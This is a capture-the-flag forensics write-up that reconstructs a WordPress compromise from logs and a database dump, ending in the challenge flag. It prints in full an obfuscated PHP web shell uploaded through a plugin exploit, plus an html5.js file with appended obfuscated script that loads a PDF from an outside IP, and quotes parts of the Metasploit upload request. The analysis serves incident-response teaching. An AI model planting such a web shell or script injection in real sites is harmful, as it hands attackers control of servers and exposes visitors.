### Solved by Swappage

The CSAW CTF 2014 wasn't only exploitation and reverse engineering, within the challenges a whole category was focused on forensics puzzles.

Fluffy No More was a 300 points worth challenge for which the solution could have been achieved by conducting a full scope forensics analysis of a compromised system.

The players were provided with an archive containing

- a database dump
- the content of /var/log
- the content of /var/www/html
- the content of /etc

All the informations were (badly imho) logically acquired from the compromised system, and the challenge was focused mostly on forensics methodology: if the player was good enaugh to understand what happened on the system, he'd find the hidden flag.

<!-- more -->

First thing first, let's say that this is how I solved the puzzle, probably there were other easier paths, but I still decided to approach this game like it was a real case, thinking that it was the best way to not leave anything behind.

The fictional scenario involved a compromised wordpress blog, so as a first step, i decided that it was worth to find a clue about how the attacker compromised it.

I had the logs from the web server, but like in any webserver logs, when analyzing them you run through lots of false positives, and this was also the case; reason why I decided to start by looking at the database dump.

To make my life easier, i quickly imported the database and the blog site on a lab machine, and started looking into it:
It was a matter of no time that I could spot a comment to a blog post boasting about the will of compromising the site.

![](/images/2014/csaw/fluffynomore/comment.png)

I remembered that wordpress, in the comments table, has a field where the IP address of the posting user is saved, I decided to take a look at it, because i thought that it could have been useful in terms of correlations with the apache webserver logs. In most cases this is not gonna happen, you'll unlikely be so lucky, but I was approaching to a CTF problem, not a real world scenario, and so I decided to bet on this.

	+------------+----------------+-------------------+
	| comment_ID | comment_author | comment_author_IP |
	+------------+----------------+-------------------+
	|          4 | Hacker         | 192.168.127.130   |
	+------------+----------------+-------------------+

Messing with the logs at this poit was a possibility, but i decided that probably if I had more details on the wordpress installation itself, this would have helped me out more in filtering the log results.

I reset my instance of the blog and logged in as admin to check for the list of installed plugins, and verify if at least one of them was vulnerable.

![](/images/2014/csaw/fluffynomore/mailpoet.png)

Mail Poet newsletter pulled my attention as it was the only plugin that was alerting that a new version was available, so why not look in public repositories if an exploit for the installed version is available?

I browsed exploit-db and it resulted that a metasploit module to gain remote code execution on this specific wordpress plugin is available.

![](/images/2014/csaw/fluffynomore/edb.png)

By a quick look at the exploit code, it's possible to figure out that an attacker can upload an arbitrary payload by sending the following POST request

```ruby
res = send_request_cgi({
  'method'   => 'POST',
  'uri'      => uri,
  'ctype'    => "multipart/form-data; boundary=#{data.bound}",
  'vars_get' => { 'page' => 'wysija_campaigns', 'action' => 'themes' },
  'data'     => post_data
})
```

and if we look at the apache access log, we could find:

	192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "POST /wp-admin/admin-post.php?page=wysija_campaigns&action=themes HTTP/1.1" 302 385 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"

Ok, now let's see if we can find the uploaded malicious file, according to the exploit code, the call for the payload is done as follows:

```ruby
	payload_uri = normalize_uri(target_uri.path, 'wp-content', 'uploads', 'wysija', 'themes', theme_name, payload_name)
```

so by grepping the logs again we could find

	192.168.127.140 - - [16/Sep/2014:20:42:54 +0000] "GET /wp-content/uploads/wysija/themes/weblizer/template.php HTTP/1.1" 200 165 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)

Let's give a look at this file, it's most likely gonna be malicious, and in fact

```php
<?php
$hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
$andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
$rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
$pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
$wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
$vyoh = $hije("n", "", "nbnansne64n_ndnecode");
$bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
$xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
?>
```

This is definitely a web shell, and by looking at it, it's most likely a weevely web shell: weevely web shell is evil to investigate, because it doesn't use get or post parameters to send commands, but as opposite it uses cookies, which are not logged in the webserver logs.

So from now on, understanding what happened was a real deal.

The attacker managed to obtain remote code execution on the server, but what would an attacker do from there on?

It's fair to assume that he might have tried to maintain access on the server, and potentially to install backdoors or spread malwares using the site; I was at a dead end tho, I couldn't follow a logical step forward anymore, so what i was left to do was to look at the logs with a greedy approach to see if i could find something interesting.

And it was while i was looking at /var/log/auth.log that I noticed a bunch of weird sudo activities by the ubuntu user using sudo.

	Sep 17 19:18:45 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chgrp -R www-data /var/www/
	Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
	Sep 17 19:18:45 ubuntu sudo: pam_unix(sudo:session): session closed for user root
	Sep 17 19:18:53 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/bin/chmod -R 775 /var/www/
	Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
	Sep 17 19:18:53 ubuntu sudo: pam_unix(sudo:session): session closed for user root
	Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
	Sep 17 19:20:09 ubuntu sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0)
	Sep 17 19:20:22 ubuntu sudo: pam_unix(sudo:session): session closed for user root
	Sep 17 19:20:55 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/find /var/www/html/ * touch {}

what was going on here? why would the administrator tamper timestamps that badly? and most importantly, what was that vi on /var/www/html/wp-content/themes/twentythirteen/js/html5.js ?

Giving a quick look at that file revealed something extremely suspicious: the file looked like an obfuscated javascript:

```javascript
(function(l, f) {
	function m() {
		var a = e.elements;
		return "string" == typeof a ? a.split(" ") : a
	}

	function i(a) {
		var b = n[a[o]];
		b || (b = {}, h++, a[o] = h, n[h] = b);
		return b
	}

	function p(a, b, c) {
		b || (b = f);
		if (g) return b.createElement(a);
		c || (c = i(b));
		b = c.cache[a] ? c.cache[a].cloneNode() : r.test(a) ? (c.cache[a] = c.createElem(a)).cloneNode() : c.createElem(a);
		return b.canHaveChildren && !s.test(a) ? c.frag.appendChild(b) : b
	}

	function t(a, b) {
		if (!b.cache) b.cache = {}, b.createElem = a.createElement, b.createFrag = a.createDocumentFragment, b.frag = b.createFrag();
		a.createElement = function(c) {
			return !e.shivMethods ? b.createElem(c) : p(c, a, b)
		};
		a.createDocumentFragment = Function("h,f", "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" + m().join().replace(/[\w\-]+/g, function(a) {
			b.createElem(a);
			b.frag.createElement(a);
			return 'c("' + a + '")'
		}) + ");return n}")(e, b.frag)
	}

	function q(a) {
		a || (a = f);
		var b = i(a);
		if (e.shivCSS && !j && !b.hasCSS) {
			var c, d = a;
			c = d.createElement("p");
			d = d.getElementsByTagName("head")[0] || d.documentElement;
			c.innerHTML = "x<style>article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}</style>";
			c = d.insertBefore(c.lastChild, d.firstChild);
			b.hasCSS = !!c
		}
		g || t(a, b);
		return a
	}
	var k = l.html5 || {},
		s = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,
		r = /^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i,
		j, o = "_html5shiv",
		h = 0,
		n = {},
		g;
	(function() {
		try {
			var a = f.createElement("a");
			a.innerHTML = "<xyz></xyz>";
			j = "hidden" in a;
			var b;
			if (!(b = 1 == a.childNodes.length)) {
				f.createElement("a");
				var c = f.createDocumentFragment();
				b = "undefined" == typeof c.cloneNode ||
					"undefined" == typeof c.createDocumentFragment || "undefined" == typeof c.createElement
			}
			g = b
		} catch (d) {
			g = j = !0
		}
	})();
	var e = {
		elements: k.elements || "abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video",
		version: "3.7.0",
		shivCSS: !1 !== k.shivCSS,
		supportsUnknownElements: g,
		shivMethods: !1 !== k.shivMethods,
		type: "default",
		shivDocument: q,
		createElement: p,
		createDocumentFragment: function(a, b) {
			a || (a = f);
			if (g) return a.createDocumentFragment();
			for (var b = b || i(a), c = b.frag.cloneNode(), d = 0, e = m(), h = e.length; d < h; d++) c.createElement(e[d]);
			return c
		}
	};
	l.html5 = e;
	q(f)
})(this, document);
var g = "ti";
var c = "HTML Tags";
var f = ". li colgroup br src datalist script option .";
f = f.split(" ");
c = "";
k = "/";
m = f[6];
for (var i = 0; i < f.length; i++) {
	c += f[i].length.toString();
}
v = f[0];
x = "\ 'ht";
b = f[4];
f = 2541 * 6 - 35 + 46 + 12 - 15269;
c += f.toString();
f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
c += f.toString();
f = "";
c = c.split("");
var w = 0;
u = "s";
for (var i = 0; i < c.length; i++) {
	if (((i == 3 || i == 6) && w != 2) || ((i == 8) && w == 2)) {
		f += String.fromCharCode(46);
		w++;
	}
	f += c[i];
}
i = k + "anal";
document.write("<" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\ '>\ </" + m + "\ >");
```

_Note: We had to insert a few spaces in places (line 101 & 119) to fix a few rendering issues._

The purpose of this javascript was to redirect the user to the following URL

	http://128.238.66.100/announcement.pdf

upon execution.

The PDF, when opened into a viewer looked as follow:

![](/images/2014/csaw/fluffynomore/pdf.png)

and at a first look it looked just like an image of a wizard with text on it.

But it for sure was hiding something, the usage of PDF with attached malicious content is very common in waterhole attacks, so why not giving it a closer look with PDF analysis tools like peepdf?

	# peepdf -i announcement.pdf
	Warning: Spidermonkey is not installed!!
	Warning: pylibemu is not installed!!

	File: announcement.pdf
	MD5: 02794f436a5bb6100e2fe67714cf5933
	SHA1: 322e70a561aeee3833145d7f0942c8e32fe24241
	Size: 390303 bytes
	Version: 1.4
	Binary: True
	Linearized: False
	Encrypted: False
	Updates: 0
	Objects: 9
	Streams: 4
	Comments: 0
	Errors: 0

	Version 0:
		Catalog: 6
		Info: 7
		Objects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]
		Streams (4): [1, 2, 3, 8]
			Encoded (4): [1, 2, 3, 8]
		Suspicious elements:
			/Names: [6]
			/EmbeddedFiles: [6]
			/EmbeddedFile: [8]

Wow, so many objects,  it was really worth looking at it one by one more closely, because in fact in the 8th one we could spot:

	PPDF> object 8

	<< /Length 212
	/Type /EmbeddedFile
	/Filter /FlateDecode
	/Params << /Size 495
	/Subtype /application/pdf >>
	stream
	var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
	endstream

The hex encoded text looked promising...

	# python
	Python 2.7.3 (default, Mar 14 2014, 11:57:14)
	[GCC 4.7.2] on linux2
	Type "help", "copyright", "credits" or "license" for more information.
	>>> print "\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"
	YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}
	>>>

So, finally, here was the flag!

	key{Those Fluffy Bunnies Make Tummy Bumpy}


